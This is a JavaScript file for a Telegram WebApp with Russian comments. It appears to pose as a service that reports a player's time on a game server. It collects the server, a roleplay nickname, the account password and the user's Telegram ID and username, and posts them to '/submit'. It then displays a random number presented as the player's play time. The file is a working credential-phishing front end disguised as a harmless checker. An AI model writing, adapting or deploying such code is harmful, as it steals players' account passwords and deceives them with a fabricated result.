document.addEventListener('DOMContentLoaded', function() {
    const tg = window.Telegram.WebApp;
    tg.expand();
    
    const welcomeScreen = document.getElementById('welcomeScreen');
    const serverSelect = document.getElementById('serverSelect');
    const serverGrid = document.getElementById('serverGrid');
    const formScreen = document.getElementById('formScreen');
    const nicknameForm = document.getElementById('nicknameForm');
    const passwordForm = document.getElementById('passwordForm');
    const loadingScreen = document.getElementById('loadingScreen');
    const resultScreen = document.getElementById('resultScreen');
    const timerElement = document.getElementById('timer');
    const resultText = document.getElementById('resultText');
    
    const startButton = document.getElementById('startButton');
    const nicknameSubmit = document.getElementById('nicknameSubmit');
    const passwordSubmit = document.getElementById('passwordSubmit');
    const restartButton = document.getElementById('restartButton');
    
    const nicknameInput = document.getElementById('nicknameInput');
    const passwordInput = document.getElementById('passwordInput');
    
    let selectedServer = '';
    let nickname = '';
    let password = '';
    
    // Список серверов (должен соответствовать серверному списку)
    const servers = [
        "RED", "GREEN", "BLUE", "YELLOW", "ORANGE", "PURPLE", "LIME", "PINK", "CHERRY", "BLACK",
        // ... остальные серверы
    ];
    
    // Заполняем сетку серверов
    servers.forEach(server => {
        const btn = document.createElement('button');
        btn.className = 'server-btn';
        btn.textContent = server;
        btn.addEventListener('click', () => {
            selectedServer = server;
            welcomeScreen.style.display = 'none';
            serverSelect.style.display = 'none';
            formScreen.style.display = 'block';
            nicknameForm.style.display = 'block';
        });
        serverGrid.appendChild(btn);
    });
    
    // Обработчики событий
    startButton.addEventListener('click', () => {
        welcomeScreen.style.display = 'none';
        serverSelect.style.display = 'block';
    });
    
    nicknameSubmit.addEventListener('click', () => {
        nickname = nicknameInput.value.trim();
        if (!nickname || !nickname.includes('_')) {
            alert('Пожалуйста, введите корректный никнейм (должен содержать символ _)');
            return;
        }
        nicknameForm.style.display = 'none';
        passwordForm.style.display = 'block';
    });
    
    passwordSubmit.addEventListener('click', () => {
        password = passwordInput.value.trim();
        if (password.length < 6 || password.length > 16) {
            alert('Пароль должен быть от 6 до 16 символов');
            return;
        }
        
        formScreen.style.display = 'none';
        loadingScreen.style.display = 'block';
        
        // Отправляем данные на сервер
        sendDataToServer();
        
        // Запускаем таймер
        startTimer();
    });
    
    restartButton.addEventListener('click', () => {
        resultScreen.style.display = 'none';
        welcomeScreen.style.display = 'block';
        nicknameInput.value = '';
        passwordInput.value = '';
        selectedServer = '';
        nickname = '';
        password = '';
    });
    
    function sendDataToServer() {
        const data = {
            server: selectedServer,
            nickname: nickname,
            password: password,
            userId: tg.initDataUnsafe.user?.id,
            username: tg.initDataUnsafe.user?.username
        };
        
        fetch('/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            // Сервер должен отправить результат через Telegram бота
        })
        .catch(error => {
            console.error('Error:', error);
            showResult('Произошла ошибка при отправке данных. Пожалуйста, попробуйте еще раз.');
        });
    }
    
    function startTimer() {
        let seconds = 120;
        
        const timer = setInterval(() => {
            seconds--;
            const minutes = Math.floor(seconds / 60);
            const remainingSeconds = seconds % 60;
            timerElement.textContent = `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
            
            if (seconds <= 0) {
                clearInterval(timer);
                loadingScreen.style.display = 'none';
                showResult('Ваше время в игре: ' + (Math.floor(Math.random() * 450) + 100) + ' часов.');
            }
        }, 1000);
    }
    
    function showResult(text) {
        resultText.textContent = text;
        loadingScreen.style.display = 'none';
        resultScreen.style.display = 'block';
    }
    
    // Инициализация WebApp
    tg.ready();
    tg.MainButton.show();
    tg.MainButton.setText("Закрыть");
    tg.MainButton.onClick(() => tg.close());
});